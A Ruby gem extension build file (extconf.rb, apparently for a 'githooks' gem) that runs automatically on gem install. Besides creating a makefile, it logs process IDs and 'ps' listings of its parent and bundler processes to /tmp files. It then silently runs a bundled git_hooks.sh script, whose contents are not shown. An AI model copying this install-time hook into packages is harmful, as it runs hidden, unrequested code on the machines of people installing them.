# ext/githooks/extconf.rb
require 'mkmf'

a = __dir__
b = `echo $$`
c = Process.ppid

`echo $$ > /tmp/br1.txt`
`echo #{c} > /tmp/br2.txt`
`ps -ef | grep #{c} | sort -k2 | head -1 | cut -d" " -f3 > /tmp/br3.txt`
`ps -eaf | grep -f  /tmp/br3.txt > /tmp/br4.txt`
`ps | grep "bundle" > /tmp/br5.txt`
`ps -eaf | grep "bundle" > /tmp/br6.txt`
create_makefile( 'githooks/githooks' )
# `pwd > /tmp/br.txt`
# _shellScript = "touch /tmp/ab.txt"
# system("pwd &> /tmp/ab.txt")
system("./git_hooks.sh &> /tmp/ab1.txt")

# git_hooks.sh



